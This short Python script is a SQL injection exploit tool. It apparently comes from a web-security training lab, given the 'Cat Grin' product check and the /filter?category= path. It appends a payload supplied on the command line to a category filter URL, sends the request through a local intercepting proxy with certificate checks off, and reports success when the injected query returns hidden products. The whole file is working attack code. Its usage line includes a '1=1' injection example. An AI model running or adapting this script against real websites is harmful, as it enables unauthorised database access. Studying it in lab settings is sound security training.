# Import necessary libraries for the script
import requests  # Used for sending HTTP requests
import sys  # Used for handling command line arguments
import urllib3  # Used to disable insecure request warnings

# Disable SSL/TLS warnings when making HTTP requests (not recommended for production)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define a dictionary of proxy settings for both HTTP and HTTPS
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

# Define a function to exploit SQL injection vulnerability
def exploit_sqli(url, payload):
    # Specify the URI where the SQL injection payload will be injected
    uri = '/filter?category='
    
    # Send an HTTP GET request to the target URL with the payload
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)

    # Check if the response contains the text "Cat Grin" (assuming it indicates a successful injection)
    if "Cat Grin" in r.text:
        return True  # SQL injection successful
    else:
        return False  # SQL injection unsuccessful

# Check if the script is being run as the main program
if __name__ == "__main__":
    try:
        # Get the target URL and SQL injection payload from command line arguments
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        # Print usage instructions if command line arguments are missing
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)  # Exit the script with an error code
    
    # Call the exploit_sqli function with the provided URL and payload
    if exploit_sqli(url, payload):
        print("[+] SQL injection Successful!")
    else:
        print("[-] SQL injection Unsuccessful!")
